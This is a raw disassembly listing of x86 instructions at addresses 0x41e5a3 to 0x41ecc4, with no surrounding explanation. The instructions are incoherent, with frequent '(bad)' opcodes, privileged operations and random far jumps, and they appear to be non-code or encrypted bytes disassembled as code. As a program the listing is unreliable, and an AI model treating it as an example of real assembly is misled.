  41e5a3:	aam    0xa7
  41e5a5:	mov    dl,0x5c
  41e5a7:	outs   dx,DWORD PTR ds:[esi]
  41e5a8:	fild   QWORD PTR [ebp+0x6c]
  41e5ab:	and    BYTE PTR [ebp+0x6347f122],al
  41e5b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5b2:	cli    
  41e5b3:	add    BYTE PTR [eax+0x57],bl
  41e5b6:	(bad)  
  41e5b7:	in     al,0x54
  41e5b9:	jle    0x41e5d1
  41e5bb:	sub    eax,0x80947137
  41e5c0:	cli    
  41e5c1:	outs   dx,BYTE PTR ds:[esi]
  41e5c2:	scas   eax,DWORD PTR es:[edi]
  41e5c3:	sbb    ecx,edx
  41e5c5:	xchg   esp,eax
  41e5c6:	and    al,0x75
  41e5c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5c9:	mov    eax,eax
  41e5cb:	mov    ch,0xc3
  41e5cd:	inc    ebx
  41e5ce:	gs ss lock mov bh,0x66
  41e5d3:	pop    ds
  41e5d4:	loop   0x41e576
  41e5d6:	adc    esp,DWORD PTR [eax+eiz*1+0x58]
  41e5da:	ror    DWORD PTR [eax],0x5d
  41e5dd:	dec    ecx
  41e5de:	(bad)  
  41e5df:	aad    0xa6
  41e5e1:	sub    BYTE PTR [ebx],dh
  41e5e3:	pop    edx
  41e5e4:	sbb    dh,BYTE PTR [ebx+ecx*4]
  41e5e7:	xchg   edx,eax
  41e5e8:	loopne 0x41e5d8
  41e5ea:	std    
  41e5eb:	dec    ebp
  41e5ec:	dec    edx
  41e5ed:	jl     0x41e657
  41e5ef:	pushf  
  41e5f0:	fistp  DWORD PTR [edx]
  41e5f2:	mov    ch,0x85
  41e5f4:	dec    eax
  41e5f5:	sbb    ch,BYTE PTR [ecx]
  41e5f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5f8:	inc    ecx
  41e5f9:	mov    eax,DWORD PTR [ecx+0xbfb363f]
  41e5ff:	jo     0x41e5ce
  41e601:	or     ebp,edx
  41e603:	pop    edi
  41e604:	cmp    al,0xad
  41e606:	imul   esp,DWORD PTR [esi+0x76d3ea3b],0xfa691d9c
  41e610:	mov    fs,WORD PTR [edx]
  41e612:	xchg   ebp,eax
  41e613:	hlt    
  41e614:	nop
  41e615:	xor    eax,0xbbc82f78
  41e61a:	loope  0x41e5ab
  41e61c:	cmp    dh,BYTE PTR [edi-0x74]
  41e61f:	sbb    BYTE PTR [ebx],dl
  41e621:	cdq    
  41e622:	xor    eax,DWORD PTR [edi+0xc357424]
  41e628:	add    bh,BYTE PTR [esi-0x7a]
  41e62b:	inc    ebp
  41e62c:	pop    ebp
  41e62d:	mov    ah,0xf7
  41e62f:	mov    eax,ds:0x36f84186
  41e634:	prefetch (bad)
  41e635:	or     eax,0xf2c0f6c3
  41e63a:	in     al,dx
  41e63b:	add    DWORD PTR [edi-0x38],edi
  41e63e:	add    dh,BYTE PTR [edx-0x2c]
  41e641:	dec    eax
  41e642:	add    eax,0x6324a8c4
  41e647:	fxch   st(1)
  41e649:	jecxz  0x41e6a2
  41e64b:	popf   
  41e64c:	imul   ebp,ebx,0xfbc73625
  41e652:	icebp  
  41e653:	mov    ds:0x6a60106d,eax
  41e658:	sbb    BYTE PTR [ecx-0x80],ah
  41e65b:	cmp    al,0xed
  41e65d:	mov    al,ds:0xde5d34e8
  41e662:	lds    ebx,FWORD PTR [esi+0x14]
  41e665:	outs   dx,BYTE PTR ds:[esi]
  41e666:	xor    al,0x3a
  41e668:	out    dx,al
  41e669:	repnz sbb al,0x29
  41e66c:	push   ebp
  41e66d:	sub    eax,0x6d77ce33
  41e672:	mov    ah,0x97
  41e674:	imul   edx,DWORD PTR [ecx+0xf654bdd],0xb3b8c305
  41e67e:	xchg   edx,eax
  41e67f:	or     esi,DWORD PTR [esi+eiz*4-0x40125835]
  41e686:	(bad)  
  41e687:	out    0xda,eax
  41e689:	ss xchg esp,eax
  41e68b:	jmp    0x41e6ea
  41e68d:	pop    ecx
  41e68e:	popf   
  41e68f:	push   esi
  41e690:	aaa    
  41e691:	stc    
  41e692:	xchg   edi,eax
  41e693:	les    ecx,FWORD PTR [esi+0x5522b2c]
  41e699:	aam    0x28
  41e69b:	dec    esi
  41e69c:	rcl    BYTE PTR [edi+0x1],cl
  41e69f:	pop    esi
  41e6a0:	in     eax,dx
  41e6a1:	add    BYTE PTR ds:0xedb6b3dc,cl
  41e6a7:	retf   
  41e6a8:	cmp    DWORD PTR [edi+esi*1],edx
  41e6ab:	or     eax,0xaf91b6e
  41e6b0:	pop    esi
  41e6b1:	adc    al,0xc3
  41e6b3:	inc    ebp
  41e6b4:	add    al,0x32
  41e6b6:	call   0xe4de806f
  41e6bb:	and    eax,ebp
  41e6bd:	push   eax
  41e6be:	popf   
  41e6bf:	js     0x41e728
  41e6c1:	test   BYTE PTR [eax],0xcc
  41e6c4:	mov    ah,0x43
  41e6c6:	pop    eax
  41e6c7:	or     eax,0x367551e0
  41e6cc:	fs in  eax,dx
  41e6ce:	cmp    eax,0x44155a68
  41e6d3:	test   al,0xb2
  41e6d5:	dec    ebp
  41e6d6:	(bad)  
  41e6d8:	mov    dh,0xb9
  41e6da:	(bad)  
  41e6db:	adc    al,0xb1
  41e6dd:	mov    edx,0x3f73e433
  41e6e2:	jp     0x41e69b
  41e6e4:	cmp    ebp,DWORD PTR [ebp-0x8]
  41e6e7:	add    DWORD PTR [edi],ebp
  41e6e9:	dec    edx
  41e6ea:	push   ss
  41e6eb:	add    cl,BYTE PTR [edx+0x3e]
  41e6ee:	test   al,0xdb
  41e6f0:	mov    cs,esp
  41e6f2:	mov    ah,0x42
  41e6f4:	jbe    0x41e756
  41e6f6:	cs dec ecx
  41e6f8:	add    BYTE PTR [ecx-0x56],cl
  41e6fb:	mov    cl,0x67
  41e6fd:	addr16 in eax,0x9c
  41e700:	push   ecx
  41e701:	or     eax,0x8429dffc
  41e706:	adc    esi,DWORD PTR [edi]
  41e708:	mov    eax,0xbd062139
  41e70d:	xchg   edi,eax
  41e70e:	pop    ds
  41e70f:	fld    QWORD PTR [ebx+ebp*2+0x38e31e9f]
  41e716:	scas   eax,DWORD PTR es:[edi]
  41e717:	cmp    ebp,DWORD PTR [esp+edi*8-0x80]
  41e71b:	inc    esp
  41e71c:	cdq    
  41e71d:	fcomp  DWORD PTR [esi-0x32]
  41e720:	fbstp  TBYTE PTR [eax+0x33]
  41e723:	push   ds
  41e724:	push   eax
  41e725:	inc    esp
  41e726:	sub    cl,cl
  41e728:	xor    DWORD PTR [eax],0xffffffb6
  41e72b:	mov    ecx,0xcfb6406b
  41e730:	push   DWORD PTR ds:0x27ef4f05
  41e736:	loope  0x41e76b
  41e738:	push   0x72e9ac69
  41e73d:	dec    edx
  41e73e:	inc    ebx
  41e73f:	cmp    al,0xca
  41e741:	push   eax
  41e742:	inc    edi
  41e743:	pop    edi
  41e745:	lock cld 
  41e747:	fld    QWORD PTR [esi]
  41e749:	aad    0x86
  41e74b:	jmp    0x41e6e7
  41e74d:	in     al,0xab
  41e74f:	cmp    al,0xa2
  41e751:	call   0x1f697f1c
  41e756:	xor    eax,0x5902b1f8
  41e75b:	pusha  
  41e75c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e75d:	daa    
  41e75e:	imul   ebx,DWORD PTR [ecx-0x47],0xbf293f1e
  41e765:	test   BYTE PTR [ebx-0x1fa8a555],bh
  41e76b:	or     ebp,ecx
  41e76d:	sub    ch,BYTE PTR [ecx+edi*1+0x10]
  41e771:	mov    eax,ds
  41e773:	xchg   edi,eax
  41e774:	push   ds
  41e775:	pusha  
  41e776:	add    bl,BYTE PTR [esi-0x687b44ad]
  41e77c:	mov    al,ds:0xaca0f1e6
  41e781:	cmp    eax,0x60592662
  41e786:	sbb    al,0xc3
  41e788:	mov    dl,BYTE PTR [esi]
  41e78a:	lahf   
  41e78b:	mov    ss,esi
  41e78d:	fxch   st(5)
  41e78f:	sub    al,0xff
  41e791:	push   ebp
  41e792:	jbe    0x41e75e
  41e794:	in     al,0xb6
  41e796:	aaa    
  41e797:	fld    TBYTE PTR [eax+0x19]
  41e79a:	xchg   ebx,eax
  41e79b:	stos   DWORD PTR es:[edi],eax
  41e79c:	add    al,0x35
  41e79e:	leave  
  41e79f:	dec    edx
  41e7a0:	jbe    0x41e73e
  41e7a2:	fstp   DWORD PTR [edx]
  41e7a4:	jg     0x41e75e
  41e7a6:	add    eax,0xfad4307e
  41e7ab:	xchg   ecx,eax
  41e7ac:	mov    edx,0x440e87a0
  41e7b1:	std    
  41e7b2:	mov    di,0xfaf8
  41e7b6:	retf   
  41e7b7:	mov    al,0xde
  41e7b9:	pop    ebp
  41e7ba:	enter  0x20e,0x9c
  41e7be:	nop
  41e7bf:	out    0xd5,eax
  41e7c1:	xor    al,0x47
  41e7c3:	cmp    ebx,DWORD PTR [ebx-0x4afbe18a]
  41e7c9:	mul    bl
  41e7cb:	push   esi
  41e7cc:	sti    
  41e7cd:	mov    al,ds:0x748ead7e
  41e7d2:	je     0x41e853
  41e7d4:	gs inc ebx
  41e7d6:	push   esi
  41e7d7:	xor    eax,0x529aba20
  41e7dc:	push   0xd526b686
  41e7e1:	xchg   esp,eax
  41e7e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7e3:	xor    ebp,DWORD PTR [esi+0x74]
  41e7e6:	jecxz  0x41e7b5
  41e7e8:	mov    esi,0x48e5653a
  41e7ed:	xchg   esi,eax
  41e7ee:	clc    
  41e7ef:	add    al,0x75
  41e7f1:	stos   BYTE PTR es:[edi],al
  41e7f2:	jecxz  0x41e841
  41e7f4:	ficom  WORD PTR [esi]
  41e7f6:	adc    ebp,ebx
  41e7f8:	jp     0x41e7cf
  41e7fa:	or     eax,0xaf2bae1e
  41e7ff:	bnd jge 0x41e791
  41e802:	nop
  41e803:	fbstp  TBYTE PTR [ebx+0x54]
  41e806:	jp     0x41e7f0
  41e808:	(bad)  [edx]
  41e80a:	aas    
  41e80b:	sbb    cl,BYTE PTR [esi-0x3]
  41e80e:	fisubr WORD PTR [eax+0x6a8da46d]
  41e814:	and    BYTE PTR [ebx],0x42
  41e817:	hlt    
  41e818:	xchg   DWORD PTR [esp-0x5],edi
  41e81c:	xchg   ebp,eax
  41e81d:	ror    DWORD PTR [edx+ecx*2-0x5231a447],1
  41e824:	out    dx,al
  41e825:	mov    WORD PTR [esi-0x4b29e1d9],gs
  41e82b:	sahf   
  41e82c:	add    BYTE PTR [esi-0xf],dl
  41e82f:	dec    ecx
  41e830:	out    dx,eax
  41e831:	out    dx,eax
  41e832:	mov    dl,0xb4
  41e834:	aaa    
  41e835:	popa   
  41e836:	mov    edx,0x9aa812cf
  41e83b:	add    DWORD PTR [esp+eiz*2-0x64aea8],edx
  41e842:	(bad)  
  41e843:	das    
  41e844:	mov    BYTE PTR [edx+0x25],dl
  41e847:	test   eax,0xd88f74ef
  41e84c:	add    esp,0x1
  41e84f:	wrmsr  
  41e851:	mov    bl,0x7b
  41e853:	into   
  41e854:	cdq    
  41e855:	ds clc 
  41e857:	inc    eax
  41e858:	pop    es
  41e859:	jne    0x41e8a8
  41e85b:	dec    edx
  41e85c:	pop    es
  41e85d:	fstp   TBYTE PTR [eax-0x16]
  41e860:	inc    esp
  41e861:	and    al,0xf5
  41e863:	sti    
  41e864:	jmp    0x91ea:0xec4f12aa
  41e86b:	aaa    
  41e86c:	stos   DWORD PTR es:[edi],eax
  41e86d:	xchg   esi,eax
  41e86e:	xlat   BYTE PTR ds:[ebx]
  41e86f:	pop    esp
  41e870:	mov    edx,0xeba0a8c1
  41e875:	getsec 
  41e877:	sbb    DWORD PTR gs:[ecx-0x23],eax
  41e87b:	stc    
  41e87c:	jp     0x41e83a
  41e87e:	sub    eax,DWORD PTR [ebx-0x67]
  41e881:	mov    esi,0x222aa37
  41e886:	fcomp  st(3)
  41e888:	adc    DWORD PTR [ecx-0x6f1781d5],ebp
  41e88e:	add    esp,DWORD PTR [edx+0xdf3874]
  41e894:	lock bound edi,QWORD PTR [ebp+0x19b17832]
  41e89b:	mul    BYTE PTR [ebx-0x31582db4]
  41e8a1:	aas    
  41e8a2:	sbb    ebx,DWORD PTR [ecx+edi*4]
  41e8a5:	dec    ecx
  41e8a6:	ror    DWORD PTR [esi+esi*2+0x138f0af9],cl
  41e8ad:	call   0xdb1f:0x6f87adbf
  41e8b4:	adc    esp,DWORD PTR [esi]
  41e8b6:	inc    esp
  41e8b7:	push   edi
  41e8b8:	out    dx,eax
  41e8b9:	sar    BYTE PTR [esi-0x6f],cl
  41e8bc:	push   esi
  41e8bd:	adc    DWORD PTR [eax+eax*1-0x30],edx
  41e8c1:	je     0x41e909
  41e8c3:	sbb    BYTE PTR [eax],dh
  41e8c5:	sub    eax,0x4024fdce
  41e8ca:	dec    edi
  41e8cb:	popa   
  41e8cc:	xor    esi,DWORD PTR [edx-0x3f48f07]
  41e8d2:	rol    BYTE PTR [edx-0x7f2f9eab],cl
  41e8d8:	xor    DWORD PTR [ecx+edx*1-0x17a136a3],edi
  41e8df:	mov    eax,esp
  41e8e1:	mov    cl,BYTE PTR [ebp-0x12]
  41e8e4:	shr    DWORD PTR [edx+0x5824f25a],0xb5
  41e8eb:	into   
  41e8ec:	lods   eax,DWORD PTR ds:[esi]
  41e8ed:	or     edi,edi
  41e8ef:	loop   0x41e89f
  41e8f1:	xchg   ecx,eax
  41e8f2:	jne    0x41e888
  41e8f4:	es push ebp
  41e8f6:	inc    esi
  41e8f7:	adc    DWORD PTR [esi],0x83b39dec
  41e8fd:	mov    eax,DWORD PTR [edx]
  41e8ff:	stos   BYTE PTR es:[edi],al
  41e900:	mov    esp,edx
  41e902:	or     DWORD PTR [edx-0x30],esp
  41e905:	rcl    BYTE PTR [esp+ebp*8-0x5b],1
  41e909:	xchg   BYTE PTR [ebx+0x36],ah
  41e90c:	test   BYTE PTR [edx],dl
  41e90e:	adc    bl,BYTE PTR [ecx-0x59]
  41e911:	pop    esp
  41e912:	mov    ah,0x3f
  41e914:	sub    al,BYTE PTR [ebx+0x524c9a4]
  41e91a:	push   edi
  41e91b:	cmp    DWORD PTR [ebp+0x3d208317],ebp
  41e921:	stos   DWORD PTR es:[edi],eax
  41e922:	jns    0x41e98e
  41e924:	ja     0x41e96d
  41e926:	aas    
  41e927:	stos   DWORD PTR es:[edi],eax
  41e928:	in     eax,0x8e
  41e92a:	loopne 0x41e900
  41e92c:	lahf   
  41e92d:	add    eax,0x399e1c67
  41e932:	or     eax,0xdf2ace6c
  41e937:	shr    dh,1
  41e939:	aaa    
  41e93a:	mov    ecx,0x4020171d
  41e93f:	mov    esp,0x11edd9a9
  41e944:	xchg   esp,eax
  41e945:	into   
  41e946:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e947:	dec    edx
  41e948:	(bad)  
  41e949:	mov    ds,WORD PTR ds:0x2d80a315
  41e94f:	sub    eax,DWORD PTR [edx-0x292a441]
  41e955:	mov    dh,BYTE PTR [edx]
  41e957:	sbb    bh,BYTE PTR [edi+eiz*2+0x69562594]
  41e95e:	push   0xc0b10c36
  41e963:	int    0x2f
  41e965:	pop    esi
  41e966:	pop    ebp
  41e967:	xor    BYTE PTR [ecx+0x3e],dh
  41e96a:	push   ebp
  41e96b:	xor    al,0xea
  41e96d:	je     0x41e93a
  41e96f:	jl     0x41e922
  41e971:	xchg   DWORD PTR [edi+0x75],edx
  41e974:	stos   DWORD PTR es:[edi],eax
  41e975:	clc    
  41e976:	les    edx,FWORD PTR [ebx-0x16d7c361]
  41e97c:	gs int3 
  41e97e:	adc    al,0x88
  41e980:	dec    ebp
  41e981:	xchg   ebx,eax
  41e982:	sbb    cl,BYTE PTR [eax-0x2a]
  41e985:	fstp   QWORD PTR ds:0x2b21ab28
  41e98b:	adc    DWORD PTR [eax+edx*2-0x85c555c],0x7e6e8efa
  41e996:	mov    eax,ds:0xd03daafc
  41e99b:	(bad)  
  41e99c:	clc    
  41e99d:	dec    esp
  41e99e:	push   0x75d3c035
  41e9a3:	in     al,dx
  41e9a4:	std    
  41e9a5:	jae    0x41e9b4
  41e9a7:	call   0x362e:0x24da9dc5
  41e9ae:	ins    DWORD PTR es:[edi],dx
  41e9af:	mov    al,0x51
  41e9b1:	and    al,0xc7
  41e9b3:	jnp    0x41e975
  41e9b5:	stos   DWORD PTR es:[edi],eax
  41e9b6:	or     DWORD PTR [edi+0x16],0xffffff8c
  41e9ba:	mov    esp,eax
  41e9bc:	lods   al,BYTE PTR ds:[esi]
  41e9bd:	es and edx,edx
  41e9c0:	xchg   edx,eax
  41e9c1:	cmc    
  41e9c2:	ins    DWORD PTR es:[edi],dx
  41e9c3:	xchg   edi,eax
  41e9c4:	mov    ds:0x396654eb,al
  41e9c9:	jmp    0x9470:0x510bdc6
  41e9d0:	jp     0x41ea00
  41e9d2:	mov    edx,0x7794dbe8
  41e9d7:	mov    DWORD PTR [esi-0x1bd74ab2],ecx
  41e9dd:	ins    DWORD PTR es:[edi],dx
  41e9de:	mov    esp,0xfe1b1e57
  41e9e3:	push   DWORD PTR [ecx+0x5f]
  41e9e6:	shl    BYTE PTR [ecx-0x59],0xe5
  41e9ea:	add    al,dh
  41e9ec:	mov    ds:0x60335aca,eax
  41e9f1:	mov    edx,0x2499a91
  41e9f6:	stos   DWORD PTR es:[edi],eax
  41e9f7:	out    dx,al
  41e9f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9f9:	push   ebx
  41e9fa:	jne    0x41ea47
  41e9fc:	aaa    
  41e9fd:	daa    
  41e9fe:	pop    esi
  41e9ff:	inc    eax
  41ea00:	add    bl,cl
  41ea02:	or     BYTE PTR [ebx],dh
  41ea04:	push   0xb6c59724
  41ea09:	scas   eax,DWORD PTR es:[edi]
  41ea0a:	add    al,dl
  41ea0c:	xchg   ebp,eax
  41ea0d:	or     dh,bh
  41ea0f:	and    ebx,DWORD PTR [esi-0x31]
  41ea12:	in     eax,0x82
  41ea14:	or     bl,ah
  41ea16:	dec    esi
  41ea17:	pusha  
  41ea18:	loopne 0x41ea76
  41ea1a:	or     eax,0x1acd2270
  41ea1f:	ficomp DWORD PTR [eax]
  41ea21:	push   cs
  41ea22:	jbe    0x41ea9e
  41ea24:	xchg   esp,eax
  41ea25:	test   BYTE PTR [ecx-0x629413d0],0xc0
  41ea2c:	xor    eax,0x38357ad7
  41ea31:	test   BYTE PTR [edi],0x35
  41ea34:	sub    eax,DWORD PTR [edi-0x76]
  41ea37:	das    
  41ea38:	push   0x6c2ab7f2
  41ea3d:	icebp  
  41ea3e:	scas   eax,DWORD PTR es:[edi]
  41ea3f:	pop    esi
  41ea40:	mov    ebp,0x9d00fa9e
  41ea45:	mov    eax,DWORD PTR [edi]
  41ea47:	xchg   esi,eax
  41ea48:	leave  
  41ea49:	push   0xa306faea
  41ea4e:	pop    edi
  41ea4f:	test   DWORD PTR [ebp+0x66e86bb5],ecx
  41ea55:	das    
  41ea56:	adc    dh,BYTE PTR [ebp+0x217a2ecc]
  41ea5c:	inc    edx
  41ea5d:	mov    edx,DWORD PTR [ecx+0x8]
  41ea60:	adc    DWORD PTR [esi-0x3],0x78
  41ea64:	inc    eax
  41ea65:	sti    
  41ea66:	test   eax,0xe740e0ac
  41ea6b:	cmp    BYTE PTR [esi-0x439679f6],bh
  41ea71:	mov    ebx,0xda7ddf86
  41ea76:	mov    dh,BYTE PTR [eax+0x7e]
  41ea79:	xor    bh,BYTE PTR [edi-0x47]
  41ea7c:	ins    BYTE PTR es:[edi],dx
  41ea7d:	popf   
  41ea7e:	sahf   
  41ea7f:	or     eax,0x66033cb8
  41ea84:	cmp    esi,DWORD PTR [edi+esi*1-0xbe04a9a]
  41ea8b:	inc    ebp
  41ea8c:	in     al,dx
  41ea8d:	add    DWORD PTR [edx-0x4a561c5a],edx
  41ea93:	ins    DWORD PTR es:[edi],dx
  41ea94:	cmp    esp,DWORD PTR [esi+0x3ada75b5]
  41ea9a:	pop    ss
  41ea9b:	cdq    
  41ea9c:	jbe    0x41eae4
  41ea9e:	call   DWORD PTR [ebx-0x10]
  41eaa1:	scas   eax,DWORD PTR es:[edi]
  41eaa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eaa3:	cmp    esp,DWORD PTR [ecx+0x25]
  41eaa6:	ins    DWORD PTR es:[edi],dx
  41eaa7:	sahf   
  41eaa8:	xchg   edi,edi
  41eaaa:	outs   dx,DWORD PTR ds:[esi]
  41eaab:	ins    DWORD PTR es:[edi],dx
  41eaac:	xchg   ebx,eax
  41eaad:	pop    edx
  41eaae:	ret    
  41eaaf:	mov    eax,ds:0x30f91074
  41eab4:	dec    ebx
  41eab5:	cli    
  41eab6:	int3   
  41eab7:	fstp   DWORD PTR [ecx]
  41eab9:	mov    dh,0xf0
  41eabb:	sub    eax,0xc59ac4c3
  41eac0:	sub    DWORD PTR [edi+eax*8-0x23],esp
  41eac4:	mov    ebp,DWORD PTR [eax+eax*2+0x75e8502d]
  41eacb:	mov    ecx,0x5c98e15f
  41ead0:	jecxz  0x41eb01
  41ead2:	pop    ebx
  41ead3:	pop    edx
  41ead4:	inc    ebx
  41ead5:	cmp    eax,0x6d73d948
  41eada:	cmp    cl,0xa0
  41eadd:	xor    ebp,DWORD PTR [ebp-0x27004a22]
  41eae3:	xchg   edi,eax
  41eae4:	xor    BYTE PTR [ebx],al
  41eae6:	mov    edx,edx
  41eae8:	or     bl,BYTE PTR [ebx+0x62806940]
  41eaee:	mov    eax,ds:0xbe687660
  41eaf3:	xchg   edi,eax
  41eaf4:	pop    esi
  41eaf5:	sbb    al,0x2a
  41eaf7:	gs loope 0x41eb65
  41eafa:	cmp    eax,0x56e8857a
  41eaff:	inc    esi
  41eb00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb01:	mov    ebp,0x3b4309c3
  41eb06:	add    esp,DWORD PTR [edi+0x6ac10912]
  41eb0c:	loopne 0x41eb4a
  41eb0e:	inc    edx
  41eb0f:	mov    bh,0xec
  41eb11:	loope  0x41eb6a
  41eb13:	cmp    dl,BYTE PTR [esi+esi*1-0x22f50597]
  41eb1a:	dec    eax
  41eb1b:	int3   
  41eb1c:	aaa    
  41eb1d:	es jae 0x41eae1
  41eb20:	mov    DWORD PTR [ebx+ecx*8+0x71],edi
  41eb24:	cli    
  41eb25:	retf   
  41eb26:	in     eax,0xad
  41eb28:	repz loop 0x41eabc
  41eb2b:	out    dx,al
  41eb2c:	push   0x78ebf329
  41eb31:	add    ebp,ebp
  41eb33:	mov    al,ds:0xfe4bdca6
  41eb38:	mov    ebp,0x3cf921f9
  41eb3d:	not    BYTE PTR [esp+eax*1-0xd785483]
  41eb44:	ja     0x41eb20
  41eb46:	push   ecx
  41eb47:	ret    
  41eb48:	jnp    0x41eb6c
  41eb4a:	jp     0x41eb93
  41eb4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb4d:	inc    esi
  41eb4e:	jge    0x41eb01
  41eb50:	test   eax,0x45887d1
  41eb55:	out    dx,eax
  41eb56:	cwde   
  41eb57:	repz jmp 0x1e27:0xee1334cc
  41eb5f:	mov    bh,0x5e
  41eb61:	icebp  
  41eb62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb63:	rcl    DWORD PTR [edi-0x15a16a2f],1
  41eb69:	loop   0x41eb9d
  41eb6b:	out    0xeb,al
  41eb6d:	loop   0x41eb76
  41eb6f:	sub    bl,BYTE PTR [esi-0x76]
  41eb72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb73:	repz jo 0x41ebcb
  41eb76:	mov    esi,0x2ecd0081
  41eb7b:	gs out dx,eax
  41eb7d:	sub    ebx,0x18
  41eb80:	in     al,dx
  41eb81:	mov    esi,0x93547fac
  41eb86:	and    eax,0xdfd5e800
  41eb8b:	test   BYTE PTR [ecx],dl
  41eb8d:	xchg   ebp,eax
  41eb8e:	out    dx,eax
  41eb8f:	(bad)  
  41eb90:	and    edx,DWORD PTR [ecx-0x6a]
  41eb93:	xchg   ebx,eax
  41eb94:	imul   esp,DWORD PTR [esi],0x27
  41eb97:	jp     0x41eb59
  41eb99:	out    dx,al
  41eb9a:	imul   edi,DWORD PTR [eax-0x2ca4e549],0x30ea0212
  41eba4:	ss push ss
  41eba6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eba7:	iret   
  41eba8:	sub    BYTE PTR [eax-0x418ed5bc],ch
  41ebae:	fdivr  QWORD PTR [eax+edi*4+0x62]
  41ebb2:	lahf   
  41ebb3:	adc    dl,BYTE PTR [ebx-0x105c97e3]
  41ebb9:	int    0x92
  41ebbb:	je     0x41ebc3
  41ebbd:	sbb    eax,0x49495dba
  41ebc2:	push   ebx
  41ebc3:	ror    BYTE PTR [ebx+0x2a],1
  41ebc6:	ins    BYTE PTR es:[edi],dx
  41ebc7:	sub    DWORD PTR [ecx-0x55],edx
  41ebca:	(bad)  
  41ebcb:	sbb    eax,DWORD PTR [eax-0x22]
  41ebce:	fild   WORD PTR [edx+eax*1+0x18041166]
  41ebd5:	mov    BYTE PTR [ebx],al
  41ebd7:	xchg   edx,eax
  41ebd8:	dec    ebp
  41ebd9:	enter  0x3de1,0xb3
  41ebdd:	mov    eax,0x8afa26d5
  41ebe2:	inc    ebp
  41ebe3:	fucom  st(1)
  41ebe5:	ins    BYTE PTR es:[edi],dx
  41ebe6:	das    
  41ebe7:	inc    ecx
  41ebe8:	xchg   ebx,eax
  41ebe9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebea:	rol    DWORD PTR [edx],0xbd
  41ebed:	xchg   ecx,eax
  41ebee:	in     al,0x87
  41ebf0:	out    0xaf,al
  41ebf2:	into   
  41ebf3:	pushf  
  41ebf4:	das    
  41ebf5:	pusha  
  41ebf6:	std    
  41ebf7:	shl    BYTE PTR [ebx],cl
  41ebf9:	lea    ebp,[esi]
  41ebfb:	cmp    al,0xbf
  41ebfd:	pop    ebx
  41ebfe:	ins    DWORD PTR es:[edi],dx
  41ebff:	(bad)  
  41ec00:	jo     0x41eba2
  41ec02:	dec    ebp
  41ec03:	popf   
  41ec04:	xchg   ebx,eax
  41ec05:	cmp    eax,0xef7e8e08
  41ec0a:	jp     0x41ec06
  41ec0c:	and    al,0xe
  41ec0e:	ss jns 0x41ec10
  41ec11:	shl    BYTE PTR [edi-0x1bdfbe8f],cl
  41ec17:	or     DWORD PTR [ebx+0x65350665],edi
  41ec1d:	dec    eax
  41ec1e:	xchg   esi,eax
  41ec1f:	into   
  41ec20:	test   al,0xfc
  41ec22:	fs add eax,0x759df1b8
  41ec28:	lods   eax,DWORD PTR ds:[esi]
  41ec29:	(bad)  
  41ec2a:	mov    al,0xa2
  41ec2c:	add    al,0xc1
  41ec2e:	test   DWORD PTR ds:0xa61ddacd,edi
  41ec34:	jecxz  0x41ec7d
  41ec36:	xlat   BYTE PTR ds:[ebx]
  41ec37:	xor    eax,DWORD PTR [ecx]
  41ec39:	inc    edx
  41ec3a:	clc    
  41ec3b:	push   cs
  41ec3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec3d:	fist   DWORD PTR [ecx-0x67]
  41ec40:	stos   BYTE PTR es:[edi],al
  41ec41:	test   BYTE PTR [esi+0x13],cl
  41ec44:	rcr    BYTE PTR [ebx],0xf0
  41ec47:	cmp    BYTE PTR [edi],al
  41ec49:	add    eax,DWORD PTR [eax]
  41ec4b:	dec    edi
  41ec4c:	push   0x59
  41ec4e:	ins    DWORD PTR es:[edi],dx
  41ec4f:	outs   dx,BYTE PTR ds:[esi]
  41ec50:	and    al,0x9f
  41ec52:	pop    esi
  41ec53:	(bad)  
  41ec54:	pusha  
  41ec55:	sbb    dl,dh
  41ec57:	arpl   si,si
  41ec59:	shl    BYTE PTR [ebx-0x2849e302],1
  41ec5f:	jl     0x41ecbe
  41ec61:	popa   
  41ec62:	imul   ecx,DWORD PTR [ebx],0xbdc331c1
  41ec68:	and    ch,ah
  41ec6a:	je     0x41ec27
  41ec6c:	in     al,dx
  41ec6d:	mov    dl,0x6b
  41ec6f:	repz dec esi
  41ec71:	inc    eax
  41ec72:	outs   dx,DWORD PTR ds:[esi]
  41ec73:	stc    
  41ec74:	jecxz  0x41ec50
  41ec76:	sub    DWORD PTR [ebx+0x65f4848b],eax
  41ec7c:	stos   BYTE PTR es:[edi],al
  41ec7d:	(bad)  [edi]
  41ec7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec80:	mov    al,ds:0x7a4365e2
  41ec85:	push   edi
  41ec86:	je     0x41ed01
  41ec88:	inc    eax
  41ec89:	(bad)  
  41ec8a:	cmc    
  41ec8b:	jmp    0x37b33651
  41ec90:	fdiv   st(3),st
  41ec92:	ret    
  41ec93:	xchg   esi,eax
  41ec94:	add    al,0x9f
  41ec96:	push   ds
  41ec97:	mov    ds:0xc399812a,eax
  41ec9c:	mov    dl,0xcf
  41ec9e:	aam    0x5f
  41eca0:	test   DWORD PTR [eax+esi*1],0x492c53b7
  41eca7:	xchg   esp,eax
  41eca8:	daa    
  41eca9:	scas   eax,DWORD PTR es:[edi]
  41ecaa:	push   0xffffffd4
  41ecac:	mov    ah,0xe2
  41ecae:	mov    esi,0xc5e42525
  41ecb3:	and    BYTE PTR [edx+ebx*4-0x20],ch
  41ecb7:	not    BYTE PTR [ebp+0x73]
  41ecba:	lods   al,BYTE PTR ds:[esi]
  41ecbb:	mov    esp,0x7d92bad9
  41ecc0:	pop    es
  41ecc1:	jl     0x41ec44
  41ecc3:	inc    ebx
  41ecc4:	mov    ecx,0x78fd7f90
